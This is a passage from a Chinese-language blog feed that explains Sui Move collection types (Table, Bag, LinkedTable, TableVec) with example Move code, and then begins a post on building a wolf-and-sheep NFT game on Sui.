çš„é›†åˆæ•°æ®ç±»å‹ã€‚</p><p>å‰é¢ä»‹ç»è¿‡ï¼Œå¸¦æœ‰ dynamic field çš„å¯¹è±¡å¯ä»¥è¢«åˆ é™¤ï¼Œä½†æ˜¯è¿™å¯¹äºé“¾ä¸Šé›†åˆç±»å‹æ¥è¯´è¿™æ˜¯ä¸å¸Œæœ›å‘ç”Ÿçš„ï¼Œå› ä¸ºé“¾ä¸Šé›†åˆç±»å‹å¯èƒ½å°†æ— é™å¤šçš„é”®å€¼å¯¹ä½œä¸º dynamic field ä¿å­˜ã€‚å› æ­¤ï¼Œåœ¨ Sui æä¾›äº†ä¸¤ç§é›†åˆç±»å‹ï¼š <code>Table</code> å’Œ <code>Bag</code>ï¼Œä¸¤è€…éƒ½åŸºäº dynamic field æ„å»ºçš„æ˜ å°„ç±»å‹çš„æ•°æ®ç»“æ„ï¼Œä½†æ˜¯é¢å¤–æ”¯æŒè®¡ç®—å®ƒä»¬åŒ…å«çš„æ¡ç›®æ•°ï¼Œå¹¶é˜²æ­¢åœ¨éç©ºæ—¶æ„å¤–åˆ é™¤ã€‚</p><p><code>Table</code> å’Œ <code>Bag</code> çš„åŒºåˆ«åœ¨äºï¼ŒTable æ˜¯åŒè´¨ï¼ˆ*homogeneousï¼‰*æ˜ å°„ï¼Œæ‰€ä»¥çš„é”®å¿…é¡»æ˜¯åŒä¸€ä¸ªç±»å‹ï¼Œæ‰€ä»¥çš„å€¼ä¹Ÿå¿…é¡»æ˜¯åŒä¸€ä¸ªç±»å‹ï¼Œè€Œ Bag æ˜¯å¼‚è´¨ï¼ˆ<em>heterogeneous</em>ï¼‰æ˜ å°„ï¼Œå¯ä»¥å­˜å‚¨ä»»æ„ç±»å‹çš„é”®å€¼å¯¹ã€‚</p><p>åŒæ—¶ï¼ŒSui æ ‡å‡†åº“ä¸­è¿˜åŒ…å«å¯¹è±¡ç‰ˆæœ¬çš„ <code>Table</code> å’Œ <code>Bag</code>ï¼š <code>ObjectTable</code> å’Œ <code>ObjectBag</code>ï¼ŒåŒºåˆ«åœ¨äºå‰è€…å¯ä»¥å°†ä»»ä½• <code>store</code> èƒ½åŠ›çš„å€¼ä¿å­˜ï¼Œä½†ä»å¤–éƒ¨å­˜å‚¨æŸ¥çœ‹æ—¶ï¼Œä½œä¸ºå€¼å­˜å‚¨çš„å¯¹è±¡å°†è¢«éšè—ï¼Œåè€…åªèƒ½å°†å¯¹è±¡ä½œä¸ºå€¼å­˜å‚¨ï¼Œä½†å¯ä»¥ä»å¤–éƒ¨å­˜å‚¨ä¸­é€šè¿‡ ID è®¿é—®è¿™äº›å¯¹è±¡ã€‚</p><p>ä¸ä¹‹å‰ä»‹ç»è¿‡çš„ <code>vec_map</code> ç›¸æ¯”ï¼Œ<code>table</code> æ›´é€‚åˆç”¨æ¥å¤„ç†åŒ…å«å¤§é‡æ˜ å°„çš„æƒ…å†µã€‚</p><h3><span id="table">Table</span></h3><p>ä¸‹é¢æˆ‘ä»¬é€šè¿‡ç¤ºä¾‹æ¥å±•ç¤ºå¯¹ table çš„åŸºæœ¬æ“ä½œï¼š</p><ul><li>æ·»åŠ å…ƒç´ ï¼š <code>add</code></li><li>è¯»å–å’Œä¿®æ”¹å…ƒç´ ï¼š <code>borrow</code>ï¼Œ<code>borrow_mut</code></li><li>åˆ é™¤å…ƒç´ ï¼š <code>delete</code></li><li>å…ƒç´ é•¿åº¦ï¼š <code>length</code></li><li>åˆ¤æ–­å­˜åœ¨æ€§ï¼š<code>contains</code></li></ul><p>Object table çš„æ“ä½œä¸ table ç±»ä¼¼ã€‚</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::tables &#123;</span><br><span class="line">    <span class="keyword">use</span> sui::object::&#123;<span class="keyword">Self</span>, UID&#125;;</span><br><span class="line">    <span class="keyword">use</span> sui::transfer;</span><br><span class="line">    <span class="keyword">use</span> sui::tx_context::&#123;<span class="keyword">Self</span>, TxContext&#125;;</span><br><span class="line">    <span class="keyword">use</span> sui::table::&#123;<span class="keyword">Self</span>, Table&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> EChildAlreadyExists: <span class="type">u64</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> EChildNotExists: <span class="type">u64</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Parent</span> has key &#123;</span><br><span class="line">        id: UID,</span><br><span class="line">        children: Table&lt;<span class="type">u64</span>, Child&gt;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Child</span> has key, store &#123;</span><br><span class="line">        id: UID,</span><br><span class="line">        age: <span class="type">u64</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// åˆ›å»º Parent å¯¹è±¡</span></span><br><span class="line">    public entry fun <span class="title function_ invoke__">initialize</span>(ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        transfer::<span class="title function_ invoke__">transfer</span>(</span><br><span class="line">            Parent &#123; id: object::<span class="title function_ invoke__">new</span>(ctx), children: table::<span class="title function_ invoke__">new</span>(ctx) &#125;,</span><br><span class="line">            tx_context::<span class="title function_ invoke__">sender</span>(ctx)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public fun <span class="title function_ invoke__">child_age</span>(child: &amp;Child): <span class="type">u64</span> &#123;</span><br><span class="line">        child.age</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æŸ¥çœ‹</span></span><br><span class="line">    public fun <span class="title function_ invoke__">child_age_via_parent</span>(parent: &amp;Parent, index: <span class="type">u64</span>): <span class="type">u64</span> &#123;</span><br><span class="line">        <span class="built_in">assert!</span>(!table::<span class="title function_ invoke__">contains</span>(&amp;parent.children, index), EChildNotExists);</span><br><span class="line">        table::<span class="title function_ invoke__">borrow</span>(&amp;parent.children, index).age</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// è·å–é•¿åº¦</span></span><br><span class="line">    public fun <span class="title function_ invoke__">child_size_via_parent</span>(parent: &amp;Parent): <span class="type">u64</span> &#123;</span><br><span class="line">        table::<span class="title function_ invoke__">length</span>(&amp;parent.children)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æ·»åŠ </span></span><br><span class="line">    public entry fun <span class="title function_ invoke__">add_child</span>(parent: &amp;<span class="keyword">mut</span> Parent, index: <span class="type">u64</span>, ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        <span class="built_in">assert!</span>(table::<span class="title function_ invoke__">contains</span>(&amp;parent.children, index), EChildAlreadyExists);</span><br><span class="line">        table::<span class="title function_ invoke__">add</span>(&amp;<span class="keyword">mut</span> parent.children, index, Child &#123; id: object::<span class="title function_ invoke__">new</span>(ctx), value: <span class="number">0</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ä¿®æ”¹</span></span><br><span class="line">    public fun <span class="title function_ invoke__">mutate_child</span>(child: &amp;<span class="keyword">mut</span> Child) &#123;</span><br><span class="line">        child.age = child.age + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">mutate_child_via_parent</span>(parent: &amp;<span class="keyword">mut</span> Parent, index: <span class="type">u64</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">mutate_child</span>(table::<span class="title function_ invoke__">borrow_mut</span>(&amp;<span class="keyword">mut</span> parent.children, index));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// åˆ é™¤</span></span><br><span class="line">    public entry fun <span class="title function_ invoke__">delete_child</span>(parent: &amp;<span class="keyword">mut</span> Parent, index: <span class="type">u64</span>) &#123;</span><br><span class="line">        <span class="built_in">assert!</span>(!table::<span class="title function_ invoke__">contains</span>(&amp;parent.children, index), EChildNotExists);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">Child</span> &#123; id, age: _ &#125; = table::<span class="title function_ invoke__">remove</span>(</span><br><span class="line">            &amp;<span class="keyword">mut</span> parent.children,</span><br><span class="line">            index</span><br><span class="line">        );</span><br><span class="line">        object::<span class="title function_ invoke__">delete</span>(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="bag">Bag</span></h3><p>Bag çš„æ“ä½œä¸ table çš„æ“ä½œæ¥å£ç±»ä¼¼ï¼š</p><ul><li>æ·»åŠ å…ƒç´ ï¼š <code>add</code></li><li>è¯»å–å’Œä¿®æ”¹å…ƒç´ ï¼š <code>borrow</code>ï¼Œ<code>borrow_mut</code></li><li>åˆ é™¤å…ƒç´ ï¼š <code>delete</code></li><li>å…ƒç´ é•¿åº¦ï¼š <code>length</code></li><li>åˆ¤æ–­å­˜åœ¨æ€§ï¼š<code>contains</code></li></ul><p>è¿™é‡Œæˆ‘ä»¬ä»…å±•ç¤ºæ·»åŠ ä¸åŒç±»å‹çš„é”®å€¼å¯¹ã€‚</p><p><code>Object_bag</code> çš„æ“ä½œä¸ <code>bag</code> ç±»ä¼¼ã€‚</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::bags &#123;</span><br><span class="line">    <span class="keyword">use</span> sui::object::&#123;<span class="keyword">Self</span>, UID&#125;;</span><br><span class="line">    <span class="keyword">use</span> sui::transfer;</span><br><span class="line">    <span class="keyword">use</span> sui::tx_context::&#123;<span class="keyword">Self</span>, TxContext&#125;;</span><br><span class="line">    <span class="keyword">use</span> sui::bag::&#123;<span class="keyword">Self</span>, Bag&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> EChildAlreadyExists: <span class="type">u64</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> EChildNotExists: <span class="type">u64</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Parent</span> has key &#123;</span><br><span class="line">        id: UID,</span><br><span class="line">        children: Bag,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Child1</span> has key, store &#123;</span><br><span class="line">        id: UID,</span><br><span class="line">        value: <span class="type">u64</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Child2</span> has key, store &#123;</span><br><span class="line">        id: UID,</span><br><span class="line">        value: <span class="type">u64</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">initialize</span>(ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        transfer::<span class="title function_ invoke__">transfer</span>(</span><br><span class="line">            Parent &#123; id: object::<span class="title function_ invoke__">new</span>(ctx), children: bag::<span class="title function_ invoke__">new</span>(ctx) &#125;,</span><br><span class="line">            tx_context::<span class="title function_ invoke__">sender</span>(ctx)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æ·»åŠ ç¬¬ä¸€ç§ç±»å‹</span></span><br><span class="line">    public entry fun <span class="title function_ invoke__">add_child1</span>(parent: &amp;<span class="keyword">mut</span> Parent, index: <span class="type">u64</span>, ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        <span class="built_in">assert!</span>(bag::<span class="title function_ invoke__">contains</span>(&amp;parent.children, index), EChildAlreadyExists);</span><br><span class="line">        bag::<span class="title function_ invoke__">add</span>(&amp;<span class="keyword">mut</span> parent.children, index, Child1 &#123; id: object::<span class="title function_ invoke__">new</span>(ctx), value: <span class="number">0</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æ·»åŠ ç¬¬äºŒç§ç±»å‹</span></span><br><span class="line">    public entry fun <span class="title function_ invoke__">add_child2</span>(parent: &amp;<span class="keyword">mut</span> Parent, index: <span class="type">u64</span>, ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        <span class="built_in">assert!</span>(bag::<span class="title function_ invoke__">contains</span>(&amp;parent.children, index), EChildAlreadyExists);</span><br><span class="line">        bag::<span class="title function_ invoke__">add</span>(&amp;<span class="keyword">mut</span> parent.children, index, Child2 &#123; id: object::<span class="title function_ invoke__">new</span>(ctx), value: <span class="number">0</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="linkedtable">LinkedTable</span></h3><p><code>linked_table</code> æ˜¯å¦ä¸€ç§ä½¿ç”¨ dynamic field å®ç°çš„æ•°æ®ç»“æ„ï¼Œå®ƒä¸ <code>table</code> ç±»ä¼¼ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œå®ƒè¿˜æ”¯æŒå€¼çš„æœ‰åºæ’å…¥å’Œåˆ é™¤ã€‚å› æ­¤ï¼Œé™¤äº† table  ç±»ä¼¼çš„åŸºç¡€æ“ä½œæ–¹æ³•ï¼Œè¿˜åŒ…å« <code>front</code>ï¼Œ<code>back</code>ï¼Œ<code>push_front</code>ï¼Œ<code>push_back</code>ï¼Œ<code>pop_front</code>ï¼Œ<code>pop_back</code>ç­‰æ“ä½œï¼Œå¯¹äºæ¯ä¸€ä¸ªé”®ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ <code>prev</code> å’Œ <code>next</code> è·å–å‰ä¸€ä¸ªå’Œåä¸€ä¸ªæ’å…¥çš„é”®ã€‚</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::linked_tables &#123;</span><br><span class="line">    <span class="keyword">use</span> sui::linked_table::&#123;</span><br><span class="line">        <span class="keyword">Self</span>,</span><br><span class="line">        push_front,</span><br><span class="line">        push_back,</span><br><span class="line">        borrow,</span><br><span class="line">        borrow_mut,</span><br><span class="line">        remove,</span><br><span class="line">        pop_front,</span><br><span class="line">        pop_back,</span><br><span class="line">        contains,</span><br><span class="line">        is_empty,</span><br><span class="line">        destroy_empty</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">use</span> sui::tx_context::TxContext;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">simple_all_functions</span>(ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">table</span> = linked_table::<span class="title function_ invoke__">new</span>(ctx);</span><br><span class="line">        <span class="comment">// æ·»åŠ å­—æ®µ</span></span><br><span class="line">        <span class="title function_ invoke__">push_back</span>(&amp;<span class="keyword">mut</span> table, <span class="string">b&quot;hello&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">push_back</span>(&amp;<span class="keyword">mut</span> table, <span class="string">b&quot;goodbye&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// [b&quot;hello&quot;, b&quot;goodbye&quot;]</span></span><br><span class="line">        <span class="comment">// æ£€æŸ¥æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">        <span class="built_in">assert!</span>(<span class="title function_ invoke__">contains</span>(&amp;table, <span class="string">b&quot;hello&quot;</span>), <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(<span class="title function_ invoke__">contains</span>(&amp;table, <span class="string">b&quot;goodbye&quot;</span>), <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(!<span class="title function_ invoke__">is_empty</span>(&amp;table), <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// ä¿®æ”¹</span></span><br><span class="line">        *<span class="title function_ invoke__">borrow_mut</span>(&amp;<span class="keyword">mut</span> table, <span class="string">b&quot;hello&quot;</span>) = *<span class="title function_ invoke__">borrow</span>(&amp;table, <span class="string">b&quot;hello&quot;</span>) * <span class="number">2</span>;</span><br><span class="line">        *<span class="title function_ invoke__">borrow_mut</span>(&amp;<span class="keyword">mut</span> table, <span class="string">b&quot;goodbye&quot;</span>) = *<span class="title function_ invoke__">borrow</span>(&amp;table, <span class="string">b&quot;goodbye&quot;</span>) * <span class="number">2</span>;</span><br><span class="line">        <span class="comment">// æ£€æŸ¥ä¿®æ”¹ä¹‹åçš„å€¼</span></span><br><span class="line">        <span class="built_in">assert!</span>(*<span class="title function_ invoke__">borrow</span>(&amp;table, <span class="string">b&quot;hello&quot;</span>) == <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(*<span class="title function_ invoke__">borrow</span>(&amp;table, <span class="string">b&quot;goodbye&quot;</span>) == <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// æ’å…¥å¤´éƒ¨</span></span><br><span class="line">        <span class="title function_ invoke__">push_front</span>(&amp;<span class="keyword">mut</span> table, <span class="string">b&quot;!!!&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="comment">// b&quot;!!!&quot;, b&quot;hello&quot;, b&quot;goodbye&quot;]</span></span><br><span class="line">        <span class="comment">// åœ¨æœ«å°¾æ·»åŠ </span></span><br><span class="line">        <span class="title function_ invoke__">push_back</span>(&amp;<span class="keyword">mut</span> table, <span class="string">b&quot;?&quot;</span>, <span class="number">3</span>);</span><br><span class="line">        <span class="comment">// [b&quot;!!!&quot;, b&quot;hello&quot;, b&quot;goodbye&quot;, b&quot;?&quot;]</span></span><br><span class="line">        <span class="comment">// ä»å¤´éƒ¨å¼¹å‡º</span></span><br><span class="line">        <span class="keyword">let</span> (front_k, front_v) = <span class="title function_ invoke__">pop_front</span>(&amp;<span class="keyword">mut</span> table);</span><br><span class="line">        <span class="built_in">assert!</span>(front_k == <span class="string">b&quot;!!!&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(front_v == <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// ä»ä¸­é—´åˆ é™¤</span></span><br><span class="line">        <span class="built_in">assert!</span>(<span class="title function_ invoke__">remove</span>(&amp;<span class="keyword">mut</span> table, <span class="string">b&quot;goodbye&quot;</span>) == <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// [b&quot;hello&quot;, b&quot;?&quot;]</span></span><br><span class="line">        <span class="comment">// ä»æœ«å°¾åˆ é™¤</span></span><br><span class="line">        <span class="keyword">let</span> (back_k, back_v) = <span class="title function_ invoke__">pop_back</span>(&amp;<span class="keyword">mut</span> table);</span><br><span class="line">        <span class="built_in">assert!</span>(back_k == <span class="string">b&quot;?&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(back_v == <span class="number">3</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// ç§»å‡ºå€¼å¹¶æ£€æŸ¥</span></span><br><span class="line">        <span class="built_in">assert!</span>(<span class="title function_ invoke__">remove</span>(&amp;<span class="keyword">mut</span> table, <span class="string">b&quot;hello&quot;</span>) == <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// æ£€æŸ¥ä¸å­˜åœ¨</span></span><br><span class="line">        <span class="built_in">assert!</span>(<span class="title function_ invoke__">is_empty</span>(&amp;table), <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">destroy_empty</span>(table);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="tablevec">TableVec</span></h3><p>æœ€åï¼Œæˆ‘ä»¬ä»‹ç»ä¸€ç§åŸºäº <code>table</code> çš„æ•°æ®ç»“æ„ <code>table_vec</code>ã€‚ä»åå­—å°±å¯ä»¥çœ‹å‡ºï¼Œ<code>table_vec</code> æ˜¯ä½¿ç”¨ <code>table</code> å®ç°çš„å¯æ‰©å±• <code>vector</code>ï¼Œå®ƒä½¿ç”¨å…ƒç´ åœ¨ <code>vector</code> çš„ç´¢å¼•ä½œä¸º <code>table</code> ä¸­çš„é”®è¿›è¡Œå­˜å‚¨ã€‚<code>table_vec</code> æä¾›äº†ä¸ <code>vector</code> ç±»ä¼¼çš„æ“ä½œæ–¹æ³•ã€‚</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::table_vecs &#123;</span><br><span class="line">    <span class="keyword">use</span> sui::table_vec;</span><br><span class="line">    <span class="keyword">use</span> sui::tx_context::TxContext;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">example</span>(ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">vec</span> = table_vec::singleton&lt;<span class="type">u64</span>&gt;(<span class="number">1</span>, ctx);</span><br><span class="line"></span><br><span class="line">        table_vec::<span class="title function_ invoke__">push_back</span>(&amp;<span class="keyword">mut</span> vec, <span class="number">2</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(table_vec::<span class="title function_ invoke__">length</span>(&amp;vec) == <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">v</span> = table_vec::<span class="title function_ invoke__">borrow_mut</span>(&amp;<span class="keyword">mut</span> vec, <span class="number">1</span>);</span><br><span class="line">        *v = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">assert!</span>(table_vec::<span class="title function_ invoke__">pop_back</span>(&amp;<span class="keyword">mut</span> vec) == <span class="number">3</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(table_vec::<span class="title function_ invoke__">pop_back</span>(&amp;<span class="keyword">mut</span> vec) == <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">assert!</span>(table_vec::<span class="title function_ invoke__">is_empty</span>(&amp;vec), <span class="number">2</span>);</span><br><span class="line">        table_vec::<span class="title function_ invoke__">destroy_empty</span>(vec);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å¹¶è¿è¡Œç¤ºä¾‹ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sui client call \</span><br><span class="line">  --<span class="keyword">function</span> example \</span><br><span class="line">  --module table_vecs \</span><br><span class="line">  --package <span class="variable">$&#123;package_id&#125;</span> \</span><br><span class="line">  --gas-budget 30000</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œæˆ‘ä»¬ä»‹ç»å®Œäº† Sui Move ä¸­ä¸»è¦çš„æ•°æ®ç±»å‹åŠå…¶ä½¿ç”¨æ–¹æ³•ï¼Œå¸Œæœ›å¤§å®¶å­¦ä¹ å’Œç†è§£ Sui Move æœ‰ä¸€å®šçš„å¸®åŠ©ã€‚</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Sui æ•°æ®ç±»å‹è®²è§£
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="åŒºå—é“¾" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Sui ç±»ç‹¼ç¾Šæ¸¸æˆé¡¹ç›®å¼€å‘å®è·µ</title>
    <link href="https://qiwihui.com/qiwihui-blog-171/"/>
    <id>https://qiwihui.com/qiwihui-blog-171/</id>
    <published>2024-05-15T02:25:31.296Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ç¯‡æ–‡ç« å°†å‘ä½ ä»‹ç» Sui Move ç‰ˆæœ¬çš„ç±»ç‹¼ç¾Šæ¸¸æˆçš„åˆçº¦å’Œå‰ç«¯ç¼–å†™è¿‡ç¨‹ã€‚é˜…è¯»å‰ï¼Œå»ºè®®å…ˆç†Ÿæ‚‰ä»¥ä¸‹å†…å®¹ï¼š</p><ol><li>Sui å‘½ä»¤è¡Œçš„åŸºæœ¬æ“ä½œï¼›</li><li>Move è¯­æ³•ï¼ˆ<a href="https://mp.weixin.qq.com/s/epwJmR6oXCgtKtSbBqJyAw">åŸºç¡€</a>å’Œ<a href="https://mp.weixin.qq.com/s/OXLyiUKzpFzAzc-PVxLvTA">é«˜çº§</a>ï¼‰å’Œ Sui Move çš„å¯¹è±¡è¯­æ³•ï¼›</li><li>React åŸºæœ¬è¯­æ³•ã€‚</li></ol><p>é¡¹ç›®ä»£ç ï¼š</p><ul><li>åˆçº¦ï¼š<a href="https://github.com/AptosWolfGame/fox_game_contract">https://github.com/AptosWolfGame/fox_game_contract</a></li><li>å‰ç«¯ï¼š <a href="https://github.com/AptosWolfGame/fox_game_interface">https://github.com/AptosWolfGame/fox_game_interface</a></li></ul><p>åœ¨çº¿ Demoï¼š <a href="https://fox-game-interface.vercel.app/">https://fox-game-interface.vercel.app/</a></p><p><img src="https://user-images.githubusercontent.com/3297411/215304366-1aeb3308-5859-4613-a61a-f353d0b48877.png" alt="Untitled"></p><h2><span id="0x1-lang-yang-you-xi-de-gui-ze">0x1 ç‹¼ç¾Šæ¸¸æˆçš„è§„åˆ™</span></h2><p>ç‹¼ç¾Šæ¸¸æˆæ˜¯ä»¥å¤ªåŠä¸Šçš„ NFT æ¸¸æˆï¼Œç©å®¶é€šè¿‡è´­ä¹°NFTï¼Œç„¶åå°† NFT è´¨æŠ¼æ¥è·å–æ¸¸æˆä»£å¸ $WOOLï¼Œæ¸¸æˆä»£å¸ $WOOL å¯ç”¨äºä¹‹åçš„ NFT é“¸é€ ã€‚æœ‰è¶£çš„æ˜¯ï¼Œç‹¼ç¾Šæ¸¸æˆåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å¼•å…¥äº†éšæœºæ€§ï¼Œè®©å•çº¯çš„è´¨æŠ¼è¿‡ç¨‹å¢åŠ äº†ä¸ç¡®å®šæ€§ï¼Œå› è€Œå¸å¼•äº†å¤§é‡ç©å®¶å‚ä¸åˆ°æ¸¸æˆä¸­ï¼Œç‹¼ç¾Šæ¸¸æˆçš„å¯ç©æ€§ä¹Ÿæ˜¯å»ºç«‹åœ¨è¿™ä¸ªåŸºç¡€ä¹‹ä¸Šã€‚å…·ä½“çš„æ¸¸æˆè§„åˆ™ä¸ºï¼š</p><h3><span id="1-1-yang">1.1 <strong>ç¾Š</strong></span></h3><p>ä½ æœ‰90%çš„æ¦‚ç‡é“¸é€ ä¸€åªç¾Šï¼Œæ¯åªç¾Šéƒ½æœ‰ç‹¬ç‰¹çš„ç‰¹å¾ã€‚ä»¥ä¸‹æ˜¯ä»–ä»¬å¯ä»¥é‡‡å–çš„è¡ŒåŠ¨ï¼š</p><ol><li><p>è¿›å…¥è°·ä»“ï¼ˆStakeï¼‰</p></li><li><p>æ¯å¤©ç´¯ç§¯ 10,000 ç¾Šæ¯› $WOOL</p></li><li><p>å‰ªç¾Šæ¯› $WOOL (Claim)</p><p>æ”¶åˆ°çš„ç¾Šæ¯›80%ç´¯ç§¯åœ¨ç¾Šçš„èº«ä¸Šï¼Œç‹¼å¯¹å‰ªä¸‹çš„ç¾Šæ¯›æ”¶å–20%çš„ç¨ï¼Œä½œä¸ºä¸æ”»å‡»è°·ä»“çš„å›æŠ¥ã€‚å¾ç¨çš„ $WOOL åˆ†é…ç»™ç›®å‰åœ¨è°·ä»“ä¸­è´¨æŠ¼çš„æ‰€æœ‰ç‹¼ï¼Œæ•°é‡ä¸ä»–ä»¬çš„ Alpha åˆ†æ•°æˆæ­£æ¯”ã€‚</p></li><li><p>ç¦»å¼€è°·ä»“ï¼ˆUnstakeï¼‰</p><p>ç¾Šè¢«ä»è°·ä»“ä¸­ç§»é™¤ï¼Œæ‰€æœ‰ $WOOL éƒ½è¢«å‰ªæ‰äº†ã€‚åªæœ‰å½“ç¾Šç§¯ç´¯äº†2å¤©ä»·å€¼çš„ $WOOL æ—¶æ‰èƒ½ç¦»å¼€è°·ä»“ï¼Œç¦»å¼€è°·ä»“æ—¶ä½ æ‰€æœ‰ç´¯ç§¯çš„ $WOOL æœ‰50%çš„å‡ ç‡è¢«ç‹¼å…¨éƒ¨å·èµ°ã€‚è¢«ç›— $WOOL åˆ†é…ç»™å½“å‰åœ¨è°·ä»“ä¸­è´¨æŠ¼çš„æ‰€æœ‰ç‹¼ï¼Œæ•°é‡ä¸ä»–ä»¬çš„ Alpha åˆ†æ•°æˆæ­£æ¯”ã€‚</p></li><li><p>ä½¿ç”¨ $WOOL é“¸é€ ä¸€ä¸ªæ–°ç¾Š</p><p>é“¸é€ çš„ NFT æœ‰10%çš„å¯èƒ½æ€§å®é™…ä¸Šæ˜¯ç‹¼ï¼æ–°çš„ç¾Šæˆ–ç‹¼æœ‰10%çš„å‡ ç‡è¢«è´¨æŠ¼çš„ç‹¼å·èµ°ã€‚æ¯åªç‹¼çš„æˆåŠŸæœºä¼šä¸ä»–ä»¬çš„ Alpha åˆ†æ•°æˆæ­£æ¯”ã€‚</p></li></ol><h3><span id="1-2-lang">1.2 <strong>ç‹¼</strong></span></h3><p>ä½ æœ‰ 10% çš„æœºä¼šé“¸é€ ä¸€åªç‹¼ï¼Œæ¯åªç‹¼éƒ½æœ‰ç‹¬ç‰¹çš„ç‰¹å¾ï¼ŒåŒ…æ‹¬ 5~8 çš„ Alpha å€¼ã€‚Alphaå€¼è¶Šé«˜ï¼Œç‹¼ä»ç¨æ”¶ä¸­èµšå–çš„ $WOOL éƒ¨åˆ†è¶Šé«˜ï¼Œå·ä¸€åªæ–°é“¸é€ çš„ç¾Šæˆ–ç‹¼çš„æ¦‚ç‡ä¹Ÿè¶Šé«˜ã€‚åªæœ‰è¢«è´¨æŠ¼çš„ç‹¼æ‰èƒ½å·ç¾Šæˆ–èµšå– $WOOL 